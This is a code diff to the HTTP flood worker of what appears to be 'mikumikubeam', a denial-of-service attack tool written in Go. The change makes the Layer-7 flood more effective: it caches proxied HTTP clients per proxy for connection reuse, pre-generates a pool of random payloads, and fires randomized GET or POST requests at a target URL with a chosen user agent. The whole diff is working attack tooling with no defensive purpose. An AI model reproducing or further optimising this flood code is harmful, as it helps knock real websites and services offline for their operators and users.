@@ -3,29 +3,79 @@ package http
 import (
 	"bytes"
 	"context"
+	"fmt"
 	"io"
 	"math/rand"
 	"net/http"
+	"sync"
 	"time"
 
 	core "github.com/sammwyy/mikumikubeam/internal/engine"
 	"github.com/sammwyy/mikumikubeam/internal/netutil"
 )
 
-type floodWorker struct{}
+// Pre-generated payload pool to avoid per-request allocations and GC pressure
+const payloadPoolSize = 16
+
+var (
+	payloadPool     [payloadPoolSize]string
+	payloadPoolOnce sync.Once
+)
+
+func initPayloadPool() {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	for i := range payloadPool {
+		b := make([]byte, 512)
+		for j := range b {
+			b[j] = letters[r.Intn(len(letters))]
+		}
+		payloadPool[i] = string(b)
+	}
+}
+
+type floodWorker struct {
+	clients sync.Map // proxy key -> *http.Client (connection pooling)
+}
 
 func NewFloodWorker() *floodWorker { return &floodWorker{} }
 
-// Fire: stubbed to simulate a quick non-blocking send; replace with real HTTP request logic
+// proxyKey returns a unique key for caching HTTP clients per proxy.
+func proxyKey(p core.Proxy) string {
+	if p.Host == "" {
+		return "<direct>"
+	}
+	return fmt.Sprintf("%s://%s:%d", p.Protocol, p.Host, p.Port)
+}
+
+// getClient returns a cached HTTP client for the given proxy, creating one if needed.
+// This allows TCP/TLS connection reuse (keep-alive) across requests, which is
+// the single biggest performance win — avoids handshake overhead per request.
+func (w *floodWorker) getClient(p core.Proxy) *http.Client {
+	key := proxyKey(p)
+	if c, ok := w.clients.Load(key); ok {
+		return c.(*http.Client)
+	}
+	client := netutil.DialedHTTPClient(p, 5*time.Second, 3)
+	actual, _ := w.clients.LoadOrStore(key, client)
+	return actual.(*http.Client)
+}
+
 func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
+	payloadPoolOnce.Do(initPayloadPool)
+
 	// Use pre-parsed target node for L7 URL
 	u := params.TargetNode.ToURL()
 	target := u.String()
-	// Build client per fire to pick proxy/ua; callers may optimize by reusing transports later
-	client := netutil.DialedHTTPClient(p, 5*time.Second, 3)
-	// random boolean, but favor POST if packetSize > 64
+	// Reuse client per proxy for connection pooling
+	client := w.getClient(p)
+	// random boolean, but favor POST if packetSize > 512
 	isGet := params.PacketSize <= 512 && rand.Intn(2) == 0
-	payload := randomString(params.PacketSize)
+	// Use pre-generated payload from pool instead of allocating new string each time
+	payload := payloadPool[rand.Intn(payloadPoolSize)]
+	if params.PacketSize > 0 && params.PacketSize < len(payload) {
+		payload = payload[:params.PacketSize]
+	}
 	var req *http.Request
 	var err error
 	if isGet {
@@ -49,17 +99,4 @@ func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core
 		core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)
 	}
 	return nil
-}
-
-// randomString utility
-func randomString(n int) string {
-	if n <= 0 {
-		return ""
-	}
-	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	b := make([]byte, n)
-	for i := range b {
-		b[i] = letters[rand.Intn(len(letters))]
-	}
-	return string(b)
 }
